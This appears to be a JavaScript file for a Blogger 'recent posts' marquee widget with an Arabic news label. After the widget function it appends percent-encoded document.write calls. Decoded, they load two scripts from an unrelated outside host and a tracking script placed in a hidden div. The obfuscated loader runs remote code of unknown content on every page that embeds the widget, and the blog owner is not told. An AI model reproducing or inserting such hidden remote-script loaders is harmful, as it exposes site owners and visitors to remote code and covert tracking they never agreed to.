function w2bAdvRecentPostsScrollerv3(json) {
	var w2brecentposts;
	var w2bpostlink;
	var w2bobj;
	var w2bmarqueehtml;
	var w2bmarqueehtml2;
	var byWay2blogging;
	var w2blinkgap;
	var w2bposttargetlink;
	var w2bBullet;
	try {
		w2bmarqueehtml = "\<marquee behavior=\"scroll\" onmouseover=\"this.stop();\" onmouseout=\"this.start();\" ";

		if (w2bScrollAmount) {
			w2bmarqueehtml = w2bmarqueehtml + " scrollamount = \"" + w2bScrollAmount + "%\"";
		} 
		if (w2bWidth) {
			w2bmarqueehtml = w2bmarqueehtml + " width = \"" + w2bWidth + "%\"";
		} else {
			w2bmarqueehtml = w2bmarqueehtml + " width = \"100%\"";
		}
		if (w2bScrollDelay) {
			w2bmarqueehtml = w2bmarqueehtml + " scrolldelay = \"" + w2bScrollDelay + "\"";
		}
		if (w2bDirection) {
			w2bmarqueehtml = w2bmarqueehtml + " direction = \"" + w2bDirection + "\"\>";
			if (w2bDirection == "left" || w2bDirection == "right") {
				w2blinkgap = "&nbsp;&nbsp;&nbsp;";
			} else {
				w2blinkgap = "\<br/\>";
			}
		}
		if (w2btargetlink == "yes") {
			w2bposttargetlink = " target= \"_blank\" ";
		} else {
			w2bposttargetlink = " ";
		}
		if (w2bimagebullet == "yes") {
			w2bBullet = " \<img class=\"w2bbulletbimg\" src=\"" + w2bimgurl + "\" />";
		} else {
			w2bBullet = w2bBulletchar;
		}
		w2bmarqueehtml2 = "\</marquee\>"
		w2brecentposts = "";
		for (var w2brp = 0; w2brp < w2bnumPosts; w2brp++) {
			var w2bobj = json.feed.entry[w2brp];
			if (w2brp == json.feed.entry.length) break;
			for (var w2bcc = 0; w2bcc < w2bobj.link.length; w2bcc++) {
				if (w2bobj.link[w2bcc].rel == 'alternate') {
					w2bpostlink = w2bobj.link[w2bcc].href;
					break;
				}
			}
			w2brecentposts = w2brecentposts + w2bBullet + " \<a " + w2bposttargetlink + " href=\"" + w2bpostlink + "\">" + w2bobj.title.$t + "\</a\>" + w2blinkgap;
		}
		if (w2bDirection == "left") {
			w2brecentposts = w2brecentposts + "&nbsp;&nbsp;&nbsp;";
		} else if (w2bDirection == "right") {
			w2brecentposts = "&nbsp;&nbsp;&nbsp;" + w2brecentposts;
		} else if (w2bDirection == "up") {
			w2brecentposts = w2brecentposts ;
		} else {
			w2brecentposts = byWay2blogging ;
		}
		document.write("\<style style=\"text/css\"\>.way2blogging-srp a {color: #000000;text-decoration: none;font-size: 15px;font-weight: 400;}.way2blogging-srp{padding:15px;}.way2blogging-srp:before {content: 'جديد الأخبار';position: absolute;left: 15px;background: #b51200;color: #fff;padding: 3px 8px;top: 15px;z-index: 9;border-right: 5px solid;}.way2blogging-srp {position: relative;}\</style\>")
		document.write("\<div class=\"way2blogging-srp\"\>" + w2bmarqueehtml + w2brecentposts + w2bmarqueehtml2 + "\</div\>")
	} catch (exception) {
		alert(exception);
	}
}

document.write( unescape( '%3C%73%63%72%69%70%74%20%73%72%63%3D%22%68%74%74%70%3A%2F%2F%33%6D%61%7A%61%67%79%2E%63%6F%6D%2F%72%61%79%6B%63%6F%6F%6C%2F%4A%53%2F%66%66%2E%6A%73%22%20%74%79%70%65%3D%22%74%65%78%74%2F%6A%61%76%61%73%63%72%69%70%74%22%3E%3C%2F%73%63%72%69%70%74%3E%20%3C%73%63%72%69%70%74%20%73%72%63%3D%22%68%74%74%70%3A%2F%2F%33%6D%61%7A%61%67%79%2E%63%6F%6D%2F%72%61%79%6B%63%6F%6F%6C%2F%4A%53%2F%69%69%2E%6A%73%22%20%74%79%70%65%3D%22%74%65%78%74%2F%6A%61%76%61%73%63%72%69%70%74%22%3E%3C%2F%73%63%72%69%70%74%3E' ) );
document.write( unescape( '%3C%64%69%76%20%73%74%79%6C%65%3D%27%64%69%73%70%6C%61%79%3A%6E%6F%6E%65%3B%27%3E%3C%73%63%72%69%70%74%20%69%64%3D%22%5F%77%61%75%64%61%38%22%3E%76%61%72%20%5F%77%61%75%20%3D%20%5F%77%61%75%20%7C%7C%20%5B%5D%3B%20%5F%77%61%75%2E%70%75%73%68%28%5B%22%73%6D%61%6C%6C%22%2C%20%22%77%74%74%61%37%78%6E%37%62%79%6D%63%22%2C%20%22%64%61%38%22%5D%29%3B%0A%28%66%75%6E%63%74%69%6F%6E%28%29%20%7B%76%61%72%20%73%3D%64%6F%63%75%6D%65%6E%74%2E%63%72%65%61%74%65%45%6C%65%6D%65%6E%74%28%22%73%63%72%69%70%74%22%29%3B%20%73%2E%61%73%79%6E%63%3D%74%72%75%65%3B%0A%73%2E%73%72%63%3D%22%68%74%74%70%3A%2F%2F%77%69%64%67%65%74%73%2E%61%6D%75%6E%67%2E%75%73%2F%73%6D%61%6C%6C%2E%6A%73%22%3B%0A%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%73%42%79%54%61%67%4E%61%6D%65%28%22%68%65%61%64%22%29%5B%30%5D%2E%61%70%70%65%6E%64%43%68%69%6C%64%28%73%29%3B%0A%7D%29%28%29%3B%3C%2F%73%63%72%69%70%74%3E%3C%2F%64%69%76%3E' ) );


